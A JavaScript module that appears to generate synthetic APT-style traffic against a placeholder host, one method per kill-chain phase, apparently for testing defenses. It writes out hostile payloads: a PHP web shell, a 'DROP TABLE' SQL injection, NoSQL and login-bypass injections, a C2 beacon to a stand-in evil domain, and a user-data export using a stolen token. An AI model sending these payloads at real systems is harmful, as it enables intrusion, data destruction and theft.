/**
 * APT Simulator - Synthetic Agent
 * 
 * Simulates Advanced Persistent Threat (APT) behavior.
 * Low and slow reconnaissance, persistence establishment, lateral movement.
 * 
 * DARK LAYER ONLY - No telemetry, no logging.
 */

const PHI = 1.618033988749895;
const HB = 873;

/**
 * APT attack phases
 */
const APT_PHASES = {
  RECON: 'reconnaissance',
  WEAPONIZE: 'weaponization',
  DELIVERY: 'delivery',
  EXPLOIT: 'exploitation',
  INSTALL: 'installation',
  C2: 'command-control',
  ACTIONS: 'actions-on-objectives'
};

/**
 * APT Simulator - Nation-State Level Attack
 */
export class APTSimulator {
  constructor(config = {}) {
    this.id = `apt-${crypto.randomUUID().slice(0, 8)}`;
    this.config = {
      maxRequests: config.maxRequests || 200, // APTs are slow
      minDelay: config.minDelay || 30000, // 30 seconds minimum between actions
      maxDelay: config.maxDelay || 300000, // 5 minutes max
      daysToSimulate: config.daysToSimulate || 30,
      ...config
    };
    
    this.state = {
      requestCount: 0,
      lastRequest: null,
      phase: APT_PHASES.RECON,
      intelligence: {
        emailAddresses: [],
        technologies: new Set(),
        employees: [],
        networkMap: new Map(),
        credentials: [],
        documents: []
      },
      persistence: {
        backdoors: [],
        scheduledTasks: [],
        registryKeys: []
      },
      simulatedDay: 1
    };
  }
  
  /**
   * Generate next request based on APT phase
   */
  async nextRequest() {
    // Advance simulation day
    if (this.state.requestCount > 0 && this.state.requestCount % 7 === 0) {
      this.state.simulatedDay++;
      this.advancePhase();
    }
    
    switch (this.state.phase) {
      case APT_PHASES.RECON:
        return this.generateReconRequest();
      case APT_PHASES.WEAPONIZE:
        return this.generateWeaponizeRequest();
      case APT_PHASES.DELIVERY:
        return this.generateDeliveryRequest();
      case APT_PHASES.EXPLOIT:
        return this.generateExploitRequest();
      case APT_PHASES.INSTALL:
        return this.generateInstallRequest();
      case APT_PHASES.C2:
        return this.generateC2Request();
      case APT_PHASES.ACTIONS:
        return this.generateActionsRequest();
      default:
        return this.generateReconRequest();
    }
  }
  
  /**
   * Reconnaissance phase - OSINT gathering
   */
  generateReconRequest() {
    this.state.requestCount++;
    
    const reconTargets = [
      '/about',
      '/team',
      '/careers',
      '/contact',
      '/api/public/info',
      '/sitemap.xml',
      '/robots.txt',
      '/.well-known/security.txt',
      '/humans.txt'
    ];
    
    const target = reconTargets[this.state.requestCount % reconTargets.length];
    
    return {
      url: `https://target.local${target}`,
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache'
      },
      agentId: this.id,
      timestamp: Date.now(),
      metadata: {
        phase: APT_PHASES.RECON,
        day: this.state.simulatedDay,
        target,
        intent: 'OSINT gathering'
      }
    };
  }
  
  /**
   * Weaponization phase - craft payloads
   */
  generateWeaponizeRequest() {
    this.state.requestCount++;
    
    // Simulate checking for vulnerable technologies
    const techProbes = [
      '/api/version',
      '/api/health',
      '/wp-json/wp/v2/',
      '/api/swagger.json',
      '/.git/HEAD',
      '/composer.json',
      '/package.json'
    ];
    
    const target = techProbes[this.state.requestCount % techProbes.length];
    
    return {
      url: `https://target.local${target}`,
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Accept': 'application/json, text/plain, */*'
      },
      agentId: this.id,
      timestamp: Date.now(),
      metadata: {
        phase: APT_PHASES.WEAPONIZE,
        day: this.state.simulatedDay,
        target,
        intent: 'Technology fingerprinting for payload crafting'
      }
    };
  }
  
  /**
   * Delivery phase - phishing simulation
   */
  generateDeliveryRequest() {
    this.state.requestCount++;
    
    // Simulate spear phishing tracking pixel
    return {
      url: `https://target.local/tracking/pixel.gif?uid=${this.id}&c=${this.state.requestCount}`,
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Referer': 'https://mail.victim.local/inbox'
      },
      agentId: this.id,
      timestamp: Date.now(),
      metadata: {
        phase: APT_PHASES.DELIVERY,
        day: this.state.simulatedDay,
        intent: 'Spear phishing email tracking'
      }
    };
  }
  
  /**
   * Exploitation phase - vulnerability probing
   */
  generateExploitRequest() {
    this.state.requestCount++;
    
    const exploitAttempts = [
      { path: '/api/upload', payload: '<?php system($_GET["cmd"]); ?>' },
      { path: '/api/search', payload: "'; DROP TABLE users; --" },
      { path: '/api/user', payload: '{"$gt": ""}' }, // NoSQL injection
      { path: '/admin/login', payload: 'admin\' OR \'1\'=\'1' }
    ];
    
    const exploit = exploitAttempts[this.state.requestCount % exploitAttempts.length];
    
    return {
      url: `https://target.local${exploit.path}`,
      method: 'POST',
      headers: {
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: `input=${encodeURIComponent(exploit.payload)}`,
      agentId: this.id,
      timestamp: Date.now(),
      metadata: {
        phase: APT_PHASES.EXPLOIT,
        day: this.state.simulatedDay,
        exploitType: 'injection',
        intent: 'Initial access attempt'
      }
    };
  }
  
  /**
   * Installation phase - persistence establishment
   */
  generateInstallRequest() {
    this.state.requestCount++;
    
    const persistencePayload = {
      type: 'webshell',
      location: '/uploads/cache/.htaccess',
      content: 'backdoor'
    };
    
    return {
      url: `https://target.local/api/file/upload`,
      method: 'POST',
      headers: {
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'multipart/form-data'
      },
      body: JSON.stringify(persistencePayload),
      agentId: this.id,
      timestamp: Date.now(),
      metadata: {
        phase: APT_PHASES.INSTALL,
        day: this.state.simulatedDay,
        intent: 'Persistence mechanism installation'
      }
    };
  }
  
  /**
   * C2 phase - command and control beacon
   */
  generateC2Request() {
    this.state.requestCount++;
    
    // DNS-over-HTTPS style C2
    return {
      url: `https://target.local/api/dns?name=${this.id}.c2.evil.local&type=TXT`,
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0',
        'Accept': 'application/dns-json'
      },
      agentId: this.id,
      timestamp: Date.now(),
      metadata: {
        phase: APT_PHASES.C2,
        day: this.state.simulatedDay,
        intent: 'Command and control communication'
      }
    };
  }
  
  /**
   * Actions on Objectives - data exfiltration
   */
  generateActionsRequest() {
    this.state.requestCount++;
    
    // Simulate data exfiltration
    return {
      url: `https://target.local/api/export/users`,
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0',
        'Authorization': 'Bearer stolen-token',
        'Accept': 'application/json'
      },
      agentId: this.id,
      timestamp: Date.now(),
      metadata: {
        phase: APT_PHASES.ACTIONS,
        day: this.state.simulatedDay,
        intent: 'Data exfiltration'
      }
    };
  }
  
  /**
   * Advance to next phase
   */
  advancePhase() {
    const phases = Object.values(APT_PHASES);
    const currentIndex = phases.indexOf(this.state.phase);
    
    if (currentIndex < phases.length - 1) {
      this.state.phase = phases[currentIndex + 1];
    }
  }
  
  /**
   * Process response and gather intelligence
   */
  async processResponse(response) {
    const status = response.status;
    const body = await response.text?.() || '';
    
    // Extract intelligence based on phase
    if (this.state.phase === APT_PHASES.RECON) {
      // Extract emails
      const emailPattern = /[\w.-]+@[\w.-]+\.\w+/g;
      const emails = body.match(emailPattern) || [];
      this.state.intelligence.emailAddresses.push(...emails);
    }
    
    // Track successful actions
    if (status === 200) {
      this.state.intelligence.networkMap.set(new URL(response.url).pathname, {
        status,
        phase: this.state.phase,
        day: this.state.simulatedDay
      });
    }
  }
  
  /**
   * Check if should continue
   */
  shouldContinue() {
    return this.state.requestCount < this.config.maxRequests &&
           this.state.simulatedDay <= this.config.daysToSimulate;
  }
  
  /**
   * Get state summary
   */
  getState() {
    return {
      id: this.id,
      type: 'apt',
      requestCount: this.state.requestCount,
      phase: this.state.phase,
      simulatedDay: this.state.simulatedDay,
      intelligence: {
        emailsFound: this.state.intelligence.emailAddresses.length,
        technologies: Array.from(this.state.intelligence.technologies),
        mappedEndpoints: this.state.intelligence.networkMap.size
      },
      progress: this.state.requestCount / this.config.maxRequests
    };
  }
}

export { APT_PHASES };
export default APTSimulator;
